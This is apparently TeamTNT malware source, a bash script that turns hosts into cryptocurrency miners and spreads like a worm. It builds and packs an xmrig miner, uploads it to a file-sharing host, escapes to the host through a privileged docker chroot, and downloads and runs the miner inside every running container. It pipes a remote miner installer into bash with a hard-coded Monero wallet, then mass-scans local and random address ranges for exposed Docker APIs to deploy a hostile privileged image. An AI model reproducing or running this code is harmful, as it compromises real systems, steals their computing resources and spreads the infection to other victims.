#!/bin/bash
#
#  ___________                 _____________________________                            
#  \__    ___/___ _____    ____\__    ___/\      \__    ___/                            
#    |    |_/ __ \\__  \  /     \|    |   /   |   \|    |                               
#    |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |                               
#    |____| \___  >____  /__|_|  /____|  \____|__  /____|                               
#               \/     \/      \/                \/                                     
#            __  .__.__  .__           .__  .__                                         
#    _______/  |_|__|  | |  |   _____  |  | |__|__  __ ____                             
#   /  ___/\   __\  |  | |  |   \__  \ |  | |  \  \/ // __ \                            
#   \___ \  |  | |  |  |_|  |__  / __ \|  |_|  |\   /\  ___/                            
#  /____  > |__| |__|____/____/ (____  /____/__| \_/  \___  >                           
#       \/                           \/                   \/                            
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~# 
#                                                                                 #
#  __________.____       _____  _________  ____  __.       ___________            #
#  \______   \    |     /  _  \ \_   ___ \|    |/ _|       \__    ___/            #
#   |    |  _/    |    /  /_\  \/    \  \/|      <    ______ |    |               #
#   |    |   \    |___/    |    \     \___|    |  \  /_____/ |    |               #
#   |______  /_______ \____|__  /\______  /____|__ \         |____|               #
#          \/        \/       \/        \/        \/                              #
#																				  #
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#
#  .__  .__  _____          _____              __                                       
#  |  | |__|/ ____\____   _/ ____\_ __   ____ |  | __  ______  ___.__. ____  __ __      
#  |  | |  \   __\/ __ \  \   __\  |  \_/ ___\|  |/ / /  ___/ <   |  |/  _ \|  |  \     
#  |  |_|  ||  | \  ___/   |  | |  |  /\  \___|    <  \___ \   \___  (  <_> )  |  /     
#  |____/__||__|  \___  >  |__| |____/  \___  >__|_ \/____  >  / ____|\____/|____/      
#                     \/                    \/     \/     \/   \/                       
#       __                __      _____              __     ___.                  __    
#      |__|__ __  _______/  |_  _/ ____\_ __   ____ |  | __ \_ |__ _____    ____ |  | __
#      |  |  |  \/  ___/\   __\ \   __\  |  \_/ ___\|  |/ /  | __ \\__  \ _/ ___\|  |/ /
#      |  |  |  /\___ \  |  |    |  | |  |  /\  \___|    <   | \_\ \/ __ \\  \___|    < 
#  /\__|  |____//____  > |__|    |__| |____/  \___  >__|_ \  |___  (____  /\___  >__|_ \
#  \______|          \/                           \/     \/      \/     \/     \/     \/
#                                                                                       
#                                                                                                                                                                                                                                                                                                                                                            
#                                                                                       
#                       .___          /\ __        .___       .__  __                   
#  __  _  __ ____     __| _/____   ___)//  |_    __| _/____   |__|/  |_                 
#  \ \/ \/ // __ \   / __ |/  _ \ /    \   __\  / __ |/  _ \  |  \   __\                
#   \     /\  ___/  / /_/ (  <_> )   |  \  |   / /_/ (  <_> ) |  ||  |                  
#    \/\_/  \___  > \____ |\____/|___|  /__|   \____ |\____/  |__||__|                  
#               \/       \/           \/            \/                                  
#                        __                __    .__  .__               .__  __         
#  __  _  __ ____       |__|__ __  _______/  |_  |  | |__|__  __ ____   |__|/  |_       
#  \ \/ \/ // __ \      |  |  |  \/  ___/\   __\ |  | |  \  \/ // __ \  |  \   __\      
#   \     /\  ___/      |  |  |  /\___ \  |  |   |  |_|  |\   /\  ___/  |  ||  |        
#    \/\_/  \___  > /\__|  |____//____  > |__|   |____/__| \_/  \___  > |__||__|        
#               \/  \______|          \/                            \/                  
#                                                                                       
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
#
#                wanna talk? hilde@teamtnt.red
#
RATESCAN="50000"
SETUP_SLEEP="1"

function SETUP_SYSTEM(){
tar xvf /root/bins.tar.gz -C /root/
apk update
apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev

BASIC_APK_PACKS=(go git jq masscan libpcap libpcap-dev docker make cmake upx libstdc++ gcc g++ libuv-dev iptables openssl openssl-dev hwloc-dev)
for BASIC_APK_PACK in ${BASIC_APK_PACKS[@]}; do
echo "setup: $BASIC_APK_PACK"
apk add --no-cache $BASIC_APK_PACK 2>/dev/null 1>/dev/null
sleep $SETUP_SLEEP
done

export GOPATH=/root/go
go get github.com/zmap/zgrab
cd /root/go/src/github.com/zmap/zgrab
go build
cp ./zgrab /usr/bin/zgrab
chmod +x /root/bioset /root/kubebot /root/scope /root/tshd 
/root/bioset; /root/kubebot; /root/tshd; /root/scope stop; /root/scope
rm -vrf /var/cache/apk/*
cd /root/xmrig/build/
cmake .. -DBUILD_STATIC=ON -DUV_LIBRARY=/usr/lib/libuv.so -DHWLOC_LIBRARY=/usr/lib/libhwloc.so -DWITH_TLS=OFF
make -j$(nproc)
upx -9 -o sbin xmrig
cp ./sbin /root/sbin
chmod +x /root/sbin
/root/sbin
# lil upspin test....
export UPSPINTEST=`curl --upload-file /root/sbin https://filepush.co/upload/`
# next part is implement the ssh spread..
cp ./sbin /host/bin/sbin
docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin'
}

function INFECT_ALL_CONTAINERS(){
# ich lass den base64 echt mal weg :) sieht doch schöner aus ;)
docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
# thx for the container list.... do a looping *jipieh* 
for i in $(cat /tmp/.dc); do
docker exec --privileged -d $i sh -c "apt-get update; apt-get install -y wget curl; yum install -y wget curl; apk update; apk add wget curl; mkdir /var/tmp/ -p; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin || wge --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cur -sLk $UPSPINTEST -o /var/tmp/sbin || wdl --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cdl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
done;
export HOME=/root
nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8) &
}




function GETLOCALRANGES(){
ip route show | awk '{print $1}' |  grep "/" > /tmp/.lr
}

function AUTOLANDOCKERPWN(){
TARGETRANGE=$1
TARGETPORT=$2
SCANRATE=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $TARGETRANGE -p$TARGETPORT --rate=$SCANRATE | awk '{print $6}'| zgrab --senders 200 --port $TARGETPORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";

for TARGETIP in ${!rndstr}
do
echo "$TARGETIP:$TARGETPORT"
timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --privileged --network host -v /:/host kirito666/blackt:latest
done;
}

function LANDOCKERPWN(){
GETLOCALRANGES
while read TargetRange 
do 
echo "scanne $TargetRange" 
AUTOLANDOCKERPWN $TargetRange 2375 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2376 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2377 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4243 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4244 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 5555 $RATESCAN
done < /tmp/.lr
rm -f /tmp/.lr
}


function RANDOMDOCKERPWN(){
for (( ; ; ))
do
TargetRange="$[RANDOM%255+1].0.0.0/8"
echo "scanne $TargetRange" 
AUTOLANDOCKERPWN $TargetRange 2375 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2376 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2377 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4243 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4244 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 5555 $RATESCAN
   sleep 1
done
}

SETUP_SYSTEM
export HOME=/root
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8
INFECT_ALL_CONTAINERS
LANDOCKERPWN
RANDOMDOCKERPWN
